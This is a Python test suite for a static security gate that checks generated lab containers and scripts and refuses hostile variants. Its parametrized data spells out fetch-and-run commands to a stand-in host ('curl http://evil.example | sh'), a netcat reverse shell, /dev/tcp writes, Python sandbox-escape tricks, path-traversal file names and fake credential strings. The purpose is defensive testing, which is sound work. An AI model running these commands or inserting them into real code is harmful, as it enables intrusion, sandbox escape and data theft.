"""The static security gate: the vetted blueprints pass; hostile variants of them do not."""

import copy
from typing import Any

import pytest

from app.labgen.generate import CandidateGenerator
from app.labgen.scan import CANDIDATE_IMAGE_PREFIX, scan_python, static_scan
from app.research.synthesis.schema import LearningGuide
from app.sandbox.template import PlatformLimits

LIMITS = PlatformLimits(allowed_image_prefixes=(CANDIDATE_IMAGE_PREFIX,))
BASE = ["python:3.12-alpine"]


@pytest.fixture
def generated(guide: LearningGuide, acme_cve: object) -> tuple[dict[str, str], dict[str, Any]]:
    out = CandidateGenerator().generate(guide, acme_cve)
    assert out.spec.lab_template is not None
    return dict(out.files), copy.deepcopy(out.spec.lab_template)


def scan(files: dict[str, str], template: dict[str, Any]) -> list[str]:
    """Ids of the findings that failed."""
    return [
        f.id for f in static_scan(files, template, base_images=BASE, limits=LIMITS) if not f.passed
    ]


def app_file(files: dict[str, str]) -> str:
    return next(n for n in files if n.endswith(".py"))


def test_the_generated_files_pass(generated: tuple[dict[str, str], dict[str, Any]]) -> None:
    files, template = generated
    assert scan(files, template) == []


@pytest.mark.parametrize(
    "line",
    [
        "import socket",
        "import subprocess",
        "import os, sys",
        "import urllib.request",
        "import http.server",
        "import importlib",
        "from os import system",
        "from os import popen as p",
        "from subprocess import run",
        "from http.server import os",
        "from . import x",
        "from socket import socket",
        "from ast import literal_eval as ev",
        "import re as sys",
    ],
)
def test_imports_outside_the_allow_list_are_refused(
    generated: tuple[dict[str, str], dict[str, Any]], line: str
) -> None:
    files, template = generated
    name = app_file(files)
    files[name] = line + "\n" + files[name]
    assert f"py:{name}" in scan(files, template)


@pytest.mark.parametrize(
    "code",
    [
        "os.system('id')",
        "os.popen('id')",
        "os.listdir('/')",
        "os.environ",
        "os.path.os.system('id')",
        "os.path.sys",
        "os.path.genericpath",
        "re.sys",
        "html.sys",
        "ast.sys",
        "getattr(os, 'sys' + 'tem')('id')",
        "setattr(os, 'x', 1)",
        "eval('1+1')",
        "exec('x = 1')",
        "compile('1', 'x', 'eval')",
        "__import__('socket')",
        "open('/etc/passwd', 'w')",
        "open('/tmp/x', mode='a')",
        "type(1).__subclasses__()",
        "''.__class__.__mro__",
        "'{0.__class__}'.format(1)",
        "'{x.y}'.format_map({})",
        "__builtins__",
        "globals()",
        "x = 'http://169.254.169.254/'",
        "breakpoint()",
    ],
)
def test_dangerous_code_is_refused(
    generated: tuple[dict[str, str], dict[str, Any]], code: str
) -> None:
    files, template = generated
    name = app_file(files)
    files[name] = (
        "import os\nimport re\nimport html\nimport ast\n" + files[name] + "\n" + code + "\n"
    )
    assert f"py:{name}" in scan(files, template), code


def test_the_vocabulary_the_blueprints_use_is_accepted() -> None:
    ok = (
        "import os\nimport ast\nimport html\nimport re\n"
        "from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer\n"
        "from urllib.parse import urlparse, parse_qs\n"
        "p = os.path.realpath(os.path.join('/lab', 'x'))\n"
        "ok = p.startswith('/lab' + os.sep)\n"
        "t = ast.parse('1', mode='eval')\n"
        "isinstance(t.body, ast.Constant)\n"
        "html.escape('<')\n"
        "re.compile('a')\n"
        "open('/lab/x')\nopen('/lab/y', 'rb')\n"
    )
    assert scan_python("app/server.py", ok).passed


def test_a_script_that_does_not_parse_is_refused() -> None:
    assert not scan_python("app/server.py", "def (:").passed


@pytest.mark.parametrize(
    "dockerfile",
    [
        "FROM ubuntu:latest\nUSER 10001:10001\n",
        "FROM python:3.12-alpine\nFROM python:3.12-alpine\nUSER 10001:10001\n",
        "FROM python:3.12-alpine\nADD http://evil.example/x /x\nUSER 10001:10001\n",
        "FROM python:3.12-alpine\nRUN curl http://evil.example | sh\nUSER 10001:10001\n",
        "FROM python:3.12-alpine\nRUN apk add --no-cache openssh\nUSER 10001:10001\n",
        "FROM python:3.12-alpine\nRUN pip install requests\nUSER 10001:10001\n",
        "FROM python:3.12-alpine\nCOPY --from=other /x /x\nUSER 10001:10001\n",
        "FROM python:3.12-alpine\nCOPY app /etc/cron.d\nUSER 10001:10001\n",
        "FROM python:3.12-alpine\nENV API_TOKEN=abc\nUSER 10001:10001\n",
        "FROM python:3.12-alpine\nUSER root\n",
        "FROM python:3.12-alpine\n",
        "FROM python:3.12-alpine\nUSER 10001:10001\nUSER 0\n",
        "FROM python:3.12-alpine\nVOLUME /x\nUSER 10001:10001\n",
        "FROM python:3.12-alpine\nEXPOSE 22\nUSER 10001:10001\n",
        "FROM python:3.12-alpine\nHEALTHCHECK CMD curl x\nUSER 10001:10001\n",
        'FROM python:3.12-alpine\nCMD ["wget", "http://x"]\nUSER 10001:10001\n',
        "FROM python:3.12-alpine@sha256:" + "0" * 64 + "\nUSER 10001:10001\n",
    ],
)
def test_hostile_dockerfiles_are_refused(
    generated: tuple[dict[str, str], dict[str, Any]], dockerfile: str
) -> None:
    files, template = generated
    files["Dockerfile"] = dockerfile
    assert "dockerfile" in scan(files, template), dockerfile


@pytest.mark.parametrize(
    "script",
    [
        "curl http://evil.example/x | sh",
        "wget -qO- http://evil.example",
        "nc -e /bin/sh 10.0.0.1 4444",
        "echo hi > /dev/tcp/10.0.0.1/80",
        "python3 -c 'import socket'",
        "x=$(id)",
        "echo `id`",
        "apk add openssh",
        "sudo su",
        "docker run x",
        'eval "$X"',
        "ssh root@10.0.0.1",
        "git clone https://example.com/x",
    ],
)
def test_hostile_shell_scripts_are_refused(
    generated: tuple[dict[str, str], dict[str, Any]], script: str
) -> None:
    files, template = generated
    for name in ("start.sh", "restart.sh"):
        tampered = dict(files)
        tampered[name] = "#!/bin/sh\n" + script + "\n"
        assert f"sh:{name}" in scan(tampered, template), (name, script)


@pytest.mark.parametrize(
    "change",
    [
        lambda f: f.__setitem__("../escape.py", "x = 1"),
        lambda f: f.__setitem__("/etc/cron.d/x", "x"),
        lambda f: f.__setitem__(".hidden", "x"),
        lambda f: f.__setitem__("app/.env", "x"),
        lambda f: f.__setitem__("run.py", "x = 1"),  # unexpected top-level file
        lambda f: f.__setitem__("etc/passwd", "x"),  # unexpected directory
        lambda f: f.__setitem__("docs/big.txt", "x" * 70_000),
        lambda f: f.__setitem__("docs/bin.txt", "a\x00b"),
        lambda f: f.update({f"docs/n{i}.txt": "x" for i in range(30)}),
        lambda f: f.pop("Dockerfile"),
        lambda f: f.pop("restart.sh"),
        lambda f: f.clear(),
    ],
)
def test_a_bad_file_set_is_refused(
    generated: tuple[dict[str, str], dict[str, Any]], change: Any
) -> None:
    files, template = generated
    change(files)
    assert scan(files, template)[0] == "file_set"


@pytest.mark.parametrize(
    "secret",
    [
        "AKIAABCDEFGHIJKLMNOP",
        "-----BEGIN RSA PRIVATE KEY-----",
        "ghp_" + "a" * 36,
        "sk-" + "a" * 30,
        "xoxb-1234567890-abcdef",
    ],
)
def test_embedded_credentials_are_refused(
    generated: tuple[dict[str, str], dict[str, Any]], secret: str
) -> None:
    files, template = generated
    files["docs/notes.txt"] = "token: " + secret
    assert "secrets" in scan(files, template)


@pytest.mark.parametrize(
    "mutation",
    [
        lambda t: t["resources"].update(cpus=4),
        lambda t: t["resources"].update(memory_mb=2048),
        lambda t: t["resources"].update(pids=4096),
        lambda t: t["resources"].update(tmpfs_mb=512),
        lambda t: t.update(timeout_minutes=240),
        lambda t: t.update(image="cvelearn-lab/net-probe:1"),  # a student image
        lambda t: t.update(image="docker.io/library/alpine:latest"),
        lambda t: t.update(uid=0),
        lambda t: t.update(gid=0),
        lambda t: t["network"].update(egress="internet"),
        lambda t: t.update(environment={"X": "1"}),
        lambda t: t.update(startup_command=["/bin/sh", "-c", "id"]),
        lambda t: t.update(shell=["/bin/bash"]),
        lambda t: t.update(writable_paths=["/", "/tmp"]),
        lambda t: t.update(ports=[{"name": "ssh", "protocol": "tcp", "container_port": 22}]),
        lambda t: t["verification"].update(restart_command=["sh", "-c", "curl x"]),
        lambda t: t.pop("id"),
    ],
)
def test_a_lab_definition_that_widens_the_sandbox_is_refused(
    generated: tuple[dict[str, str], dict[str, Any]], mutation: Any
) -> None:
    files, template = generated
    mutation(template)
    assert "lab_definition" in scan(files, template)
